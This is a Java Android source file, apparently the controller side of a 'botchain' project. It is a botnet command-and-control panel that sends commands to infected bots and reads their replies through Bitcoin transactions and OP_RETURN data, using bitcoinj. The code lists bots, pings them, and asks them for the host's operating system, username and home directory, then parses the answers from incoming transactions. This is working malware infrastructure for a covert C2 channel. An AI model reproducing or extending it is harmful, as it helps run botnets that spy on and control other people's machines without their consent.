package com.example.tonipagliaro.botchain;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.ListView;
import android.widget.Toast;

import com.example.tonipagliaro.botchain.Adapter.BotListAdapter;

import org.bitcoinj.core.Address;
import org.bitcoinj.core.Coin;
import org.bitcoinj.core.Transaction;
import org.bitcoinj.core.TransactionOutput;
import org.bitcoinj.script.Script;
import org.bitcoinj.wallet.Wallet;
import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;

import java.util.ArrayList;
import java.util.List;

public class BotListActivity extends AppCompatActivity {

    static ApplicationState appState;

    BotListAdapter listaBotAdapter;

    ArrayList<String> indirizzi=new ArrayList<String>();

    ListView listView;
    Button buttonRefresh;
    Button buttonBroadcast;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_bot_list);

        appState = (ApplicationState) getApplication();

        listView = (ListView) this.findViewById(R.id.listView_bot);

        for(String s : appState.mappaIndirizzi.keySet()){
            indirizzi.add(s+"-"+appState.mappaIndirizzi.get(s));
        }

        listaBotAdapter = new BotListAdapter(this, R.layout.list_item, indirizzi);
        listView.setAdapter(listaBotAdapter);

        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, final int position, long id) {
                AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);
                builder.setTitle(R.string.title_command_dialog)
                        .setItems(R.array.command_list, new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                try {
                                    ListView lw = ((AlertDialog)dialog).getListView();
                                    Log.d("App", lw.getItemAtPosition(which).toString());
                                    String command = lw.getItemAtPosition(which).toString();
                                    switch (command) {
                                        case("Get OS"):
                                            //Per il momento lo manda aanche se il bot ha i soldi.........
                                            appState.sendCommand("os-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
                                                    new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
                                            break;
                                        case("Get Username"):
                                            //Per il momento lo manda aanche se il bot ha i soldi.........
                                            appState.sendCommand("username-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
                                                    new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
                                            break;
                                        case("Get User Home"):
                                            //Per il momento lo manda aanche se il bot ha i soldi.........
                                            appState.sendCommand("userhome-" + appState.wallet.currentReceiveKey().toAddress(appState.params).toString(),
                                                    new Address(appState.params, listView.getItemAtPosition(position).toString().split("-")[0]));
                                            break;

                                        default:
                                            break;
                                    }

                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        });
                builder.create().show();
            }
        });

        //Per il momento lo manda a tutti.............
        buttonRefresh = (Button) this.findViewById(R.id.button_refresh);
        buttonRefresh.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //Inviamo il comando solo ai bot che hanno lo stato "ok"
                try {
                    appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString(), appState.indirizzi);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                //Aggiorna lo stato dei bot in "no"
                setNoAllBots();
            }
        });

        //Per il momento lo manda a tutti.............
        buttonBroadcast = (Button) this.findViewById(R.id.button_broadcast);
        buttonBroadcast.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                AlertDialog.Builder builder = new AlertDialog.Builder(BotListActivity.this);
                builder.setTitle(R.string.title_command_dialog)
                        .setItems(R.array.command_list, new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                try {
                                    appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString(), appState.indirizzi);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                                //Aggiorna lo stato dei bot in "no"
                                setNoAllBots();
                            }
                        });
                builder.create().show();
            }
        });

        appState.wallet.addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
            @Override
            public void onCoinsReceived(Wallet wallet, Transaction tx, Coin prevBalance, Coin newBalance) {
                Coin value=tx.getValueSentToMe(wallet);
                try {
                    String mess= readOpReturn(tx);

                    String[] v=mess.split("-");
                    String comando=v[0];

                    Log.d("App","comando: "+comando);

                    String addressString=v[1];

                    Log.d("App","address:"+addressString);

                    switch (comando) {
                        case("os"):
                            String os = v[2];
                            Log.d("App", "SISTEMA OPERATIV BOT: "+os);
                            break;
                        case("ping_ok"):
                            setOkBot(addressString);
                            for(String s : appState.mappaIndirizzi.keySet()){
                                Log.d("App","indirizzo "+s +" valore "+appState.mappaIndirizzi.get(s));
                            }
                            break;
                        case("username"):
                            String username = v[2];
                            Log.d("App", "SISTEMA OPERATIV BOT: " + username);
                            break;
                        case("userhome"):
                            String userhome = v[2];
                            Log.d("App", "SISTEMA OPERATIV BOT: "+userhome);
                            break;
                        default:
                            break;
                    }



                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

    }


    public void setOkBot(String address) {
        appState.mappaIndirizzi.put(address, "ok");
        appState.saveMappaIndirizzi();
        indirizzi.clear();
        for(String s : appState.mappaIndirizzi.keySet()){
            indirizzi.add(s +"-" +appState.mappaIndirizzi.get(s));
        }
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                listaBotAdapter.notifyDataSetChanged();
            }
        });
    }

    public void setNoAllBots() {
        appState.setStatoBots("no");
        indirizzi.clear();
        for(String s : appState.mappaIndirizzi.keySet()){
            indirizzi.add(s +"-" +appState.mappaIndirizzi.get(s));
        }
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                listaBotAdapter.notifyDataSetChanged();
            }
        });
    }


    public static String readOpReturn(Transaction tx) throws Exception {
        List<TransactionOutput> ti = tx.getOutputs();
        String mess="";
        Address from = null;
        for (TransactionOutput t : ti) {
            Script script = t.getScriptPubKey();

            //prelievo dell'indirizzo
            if (t.getAddressFromP2PKHScript(appState.wallet.getParams()) != null) {
                from = t.getAddressFromP2PKHScript(appState.wallet.getParams());
            }


            if (script.isOpReturn()) {
                byte[] message = new byte[script.getProgram().length-2];

                System.arraycopy(script.getProgram(), 2, message, 0, script.getProgram().length - 2);

                mess = new String(message);
                Log.d("App", "Op_return   " + mess);
            }

        }
        return mess;
    }



    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }


}
